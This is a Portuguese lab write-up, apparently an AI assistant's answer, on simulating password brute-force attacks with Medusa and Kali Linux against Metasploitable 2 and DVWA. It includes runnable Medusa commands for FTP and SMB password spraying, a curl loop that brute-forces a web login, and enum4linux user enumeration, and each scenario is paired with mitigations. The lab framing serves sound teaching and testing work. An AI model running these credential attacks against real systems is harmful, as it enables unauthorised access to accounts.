# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
Pesquisador, segue uma descrição técnica, objetiva e adequada para documentação do desafio, focada em uso legítimo em laboratório controlado.

---

## **1. Arquitetura do Ambiente**

* **Kali Linux**: VM ofensiva com Medusa instalado.
* **Metasploitable 2**: VM vulnerável com serviços FTP, SSH, Telnet, SMB e aplicações web.
* **DVWA (opcional)**: Servidor Apache+PHP hospedado no Metasploitable ou em VM separada.
* **Rede**: VirtualBox → *Host-Only Adapter* ou *Internal Network* (isolada da Internet).
* **Validação**: Testar conectividade via `ping` e varredura com `nmap -sV <alvo>`.

---

## **2. Cenário 1 — Ataque de Força Bruta em FTP (Medusa)**

### **Wordlist simples (exemplo local)**

```
admin
msfadmin
123456
password
```

### **Comando**

```
medusa -h 192.168.56.10 -u msfadmin -P wordlist.txt -M ftp
```

### **Validação**

Ao encontrar credenciais válidas o Medusa retorna `SUCCESS`. Confirmação:

```
ftp 192.168.56.10
```

### **Mitigação**

* Desabilitar FTP em texto claro (usar SFTP).
* Implementar bloqueio por tentativas (fail2ban).
* Políticas de senha com expiração e complexidade.

---

## **3. Cenário 2 — Automação de Ataques em DVWA (Formulário Web)**

### **Dependências**

* DVWA em modo *Low Security*.
* Endpoint de login: `/dvwa/login.php`.

### **Automação (cURL)**

```
curl -X POST -d "username=admin&password=PASS" \
     http://192.168.56.10/dvwa/login.php
```

Automatização simples em shell:

```bash
for p in $(cat wordlist.txt); do
   curl -s -X POST -d "username=admin&password=$p" \
        http://192.168.56.10/dvwa/login.php | grep -q "Welcome"
   [ $? -eq 0 ] && echo "Senha encontrada: $p" && break
done
```

### **Mitigação**

* Implementar *rate limiting*.
* Captchas.
* Logoff automático.
* Monitoramento de falhas em lote.

---

## **4. Cenário 3 — Password Spraying em SMB (Medusa + Enumeração)**

### **Enumeração de usuários**

```
enum4linux -U 192.168.56.10
```

### **Spraying** (uma senha para diversos usuários)

```
medusa -h 192.168.56.10 -U users.txt -p "Password1" -M smbnt
```

### **Validação**

Conectar:

```
smbclient -L 192.168.56.10 -U <usuario>
```

### **Mitigação**

* Bloqueio por IP e por conta.
* Monitoramento de autenticações anômalas.
* Política de senhas robustas.

---

## **5. Recomendações Gerais para o Relatório**

* Definir claramente: objetivo, escopo, limitações, riscos e isolamento do ambiente.
* Registrar todos os comandos, versões das ferramentas e endereços IP.
* Inserir capturas de tela e *hashes* das wordlists usadas.
* Finalizar com análise crítica: impacto, probabilidades de exploração, medidas defensivas e relação com padrões (ex.: OWASP ASVS e Mitre ATT&CK T1110).

---

## **Referências**

1. Scarfone, K.; Mell, P. *Guide to Enterprise Password Management (NIST SP 800-118)*.
2. OWASP Foundation. *OWASP Testing Guide v4*.
3. MITRE. *ATT&CK – Brute Force (T1110)*.

Se desejar, posso converter tudo em formato de relatório, PDF técnico, modelo acadêmico ou roteiro de laboratório detalhado.
